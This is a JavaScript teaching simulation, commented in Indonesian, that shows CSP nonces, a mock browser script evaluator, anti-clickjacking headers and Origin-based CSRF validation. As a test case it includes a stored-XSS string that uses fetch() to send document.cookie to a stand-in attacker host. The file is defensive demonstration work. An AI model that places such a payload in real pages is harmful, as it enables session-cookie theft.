/**
 * SIMULATOR: Content Security Policy (CSP Nonces) & Frontend XSS / CSRF Interceptor
 * -----------------------------------------------------------------------------
 * File: csp_nonce_xss_defense_sim.js
 * Deskripsi: Simulasi mandiri (zero-dependency) dari penerbitan dynamic CSP Nonce,
 * evaluator eksekusi skrip browser terhadap injeksi XSS, penangkal Clickjacking iframe,
 * dan validator proteksi CSRF pada Server Actions.
 */

const crypto = require("crypto");

// =============================================================================
// 1. DYNAMIC CSP NONCE GENERATOR & MIDDLEWARE
// =============================================================================

class SecurityMiddleware {
  static handleRequest(request) {
    // Generate nonce unik 16-byte base64 per request
    const nonce = crypto.randomBytes(16).toString("base64");

    const cspDirectives = [
      "default-src 'self'",
      `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
      `style-src 'self' 'nonce-${nonce}'`,
      "object-src 'none'",
      "base-uri 'self'",
      "frame-ancestors 'none'", // Anti-Clickjacking
    ];

    const cspHeader = cspDirectives.join("; ");

    const headers = {
      "Content-Security-Policy": cspHeader,
      "X-Frame-Options": "DENY",
      "X-Content-Type-Options": "nosniff",
      "Referrer-Policy": "strict-origin-when-cross-origin",
      "x-request-nonce": nonce,
    };

    return { headers, nonce };
  }
}

// =============================================================================
// 2. SIMULATOR BROWSER CSP EVALUATOR & SCRIPT RUNNER
// =============================================================================

class BrowserCSPEvaluator {
  constructor(cspHeader, activeNonce) {
    this.cspHeader = cspHeader;
    this.activeNonce = activeNonce;
    this.violations = [];
    this.executedScripts = [];
  }

  evaluateScript(scriptTag) {
    // Regex parsing atribut nonce
    const nonceMatch = scriptTag.match(/nonce=["']([^"']+)["']/);
    const scriptContentMatch = scriptTag.match(/>([\s\S]*?)<\/script>/);

    const providedNonce = nonceMatch ? nonceMatch[1] : null;
    const content = scriptContentMatch ? scriptContentMatch[1].trim() : scriptTag;

    // Evaluasi CSP: Skrip inline HANYA boleh berjalan jika memiliki nonce yang cocok persis
    if (providedNonce === this.activeNonce) {
      this.executedScripts.push(content);
      return { allowed: true, reason: "NONCE_MATCH_PERFECT" };
    } else {
      const reason = providedNonce ? "INVALID_STALE_NONCE" : "MISSING_NONCE_UNTRUSTED";
      this.violations.push({ script: content, reason });
      return { allowed: false, reason };
    }
  }

  evaluateIframeEmbedding(embedderOrigin) {
    // Memeriksa direktif frame-ancestors
    if (this.cspHeader.includes("frame-ancestors 'none'")) {
      return { allowed: false, reason: "REFUSED_FRAME_ANCESTORS_NONE" };
    }
    return { allowed: true };
  }
}

// =============================================================================
// 3. SIMULATOR CSRF / SERVER ACTION ORIGIN VALIDATOR
// =============================================================================

class ServerActionCSRFValidator {
  static validate(hostHeader, originHeader) {
    if (!originHeader) {
      // Direct GET or navigation might lack origin, but state-changing POST must have it
      return { valid: false, reason: "MISSING_ORIGIN_HEADER" };
    }

    const originUrl = new URL(originHeader);
    if (originUrl.host !== hostHeader) {
      return {
        valid: false,
        status: 403,
        reason: `CSRF_ATTACK_PREVENTED: Origin '${originUrl.host}' tidak cocok dengan Host '${hostHeader}'!`,
      };
    }

    return { valid: true, status: 200, reason: "SAME_ORIGIN_VERIFIED" };
  }
}

// =============================================================================
// 4. RUN SUITE
// =============================================================================

function runSimulation() {
  console.log("===========================================================================");
  console.log("SIMULASI: DYNAMIC CSP NONCES & DEFENSIVE FRONTEND SECURITY");
  console.log("===========================================================================\n");

  // Inisialisasi request pertama
  const request1 = { url: "https://portal.bank.com/dashboard", method: "GET" };
  const { headers, nonce } = SecurityMiddleware.handleRequest(request1);

  console.log("--- TAHAP 1: Server Menerbitkan CSP Nonce Kriptografis Unik ---");
  console.log(`  Dynamic Nonce Dihasilkan : ${nonce}`);
  console.log(`  Header CSP Diterapkan    : ${headers["Content-Security-Policy"].substring(0, 75)}...\n`);

  const browser = new BrowserCSPEvaluator(headers["Content-Security-Policy"], nonce);

  // SKENARIO 1: Skrip Resmi Next.js Hydration
  console.log("--- TAHAP 2: Menguji Eksekusi Skrip pada Halaman Web ---");
  const legitScript = `<script nonce="${nonce}">window.__NEXT_DATA__ = { user: "Budi" }; console.log("Hydrated!");</script>`;
  const res1 = browser.evaluateScript(legitScript);
  console.log(`  1. Skrip Resmi Aplikasi -> Status: ${res1.allowed ? "DIIZINKAN (200 OK) ✅" : "DIBLOKIR"}`);

  // SKENARIO 2: Injeksi Stored XSS dari Komentar Pengguna (Tanpa Nonce)
  const xssScript = `<script>fetch('https://evil.darkweb.com/steal?c=' + document.cookie);</script>`;
  const res2 = browser.evaluateScript(xssScript);
  console.log(`  2. Injeksi XSS Jahat    -> Status: ${res2.allowed ? "DIIZINKAN" : "DIBLOKIR SECARA OTOMATIS 🛡️"} (${res2.reason})`);

  // SKENARIO 3: Penyerang Mencoba Menggunakan Nonce Statis Tebakan
  const forgedNonceScript = `<script nonce="static-guess-1234">alert('Pwned!');</script>`;
  const res3 = browser.evaluateScript(forgedNonceScript);
  console.log(`  3. Nonce Palsu/Kadaluwarsa -> Status: ${res3.allowed ? "DIIZINKAN" : "DIBLOKIR SECARA OTOMATIS 🛡️"} (${res3.reason})\n`);

  // SKENARIO 4: PENGUJIAN ANTI-CLICKJACKING
  console.log("--- TAHAP 3: Pengujian Serangan Clickjacking (Iframe Embedding) ---");
  const attackerSite = "https://situs-undian-palsu.xyz";
  console.log(`  Penyerang mencoba membungkus web bank di iframe situs: '${attackerSite}'...`);
  const frameRes = browser.evaluateIframeEmbedding(attackerSite);
  console.log(`  Status Penyematan Iframe -> ${frameRes.allowed ? "IZINKAN" : "DITOLAK BROWSER TOTAL 🛡️"} (${frameRes.reason})\n`);

  // SKENARIO 5: PENGUJIAN CSRF PADA REACT SERVER ACTION
  console.log("--- TAHAP 4: Pengujian CSRF pada React Server Actions ---");
  const legitimateHost = "portal.bank.com";

  // A. Request sah dari formulir sendiri
  const sameOriginRes = ServerActionCSRFValidator.validate(legitimateHost, "https://portal.bank.com");
  console.log(`  A. Server Action dari domain sendiri : Status ${sameOriginRes.status} -> ${sameOriginRes.reason} ✅`);

  // B. Serangan CSRF dari situs phishing pihak ketiga
  const crossOriginRes = ServerActionCSRFValidator.validate(legitimateHost, "https://evil-phishing.org");
  console.log(`  B. Server Action dari pihak ketiga   : Status ${crossOriginRes.status} -> ${crossOriginRes.reason} 🛡️\n`);

  console.log("Ringkasan Pelanggaran CSP yang Berhasil Ditangkal:");
  console.table(browser.violations);

  console.log("===========================================================================");
  console.log("SIMULASI SELESAI: Seluruh vektor serangan frontend berhasil dimatikan!");
  console.log("===========================================================================");
}

runSimulation();
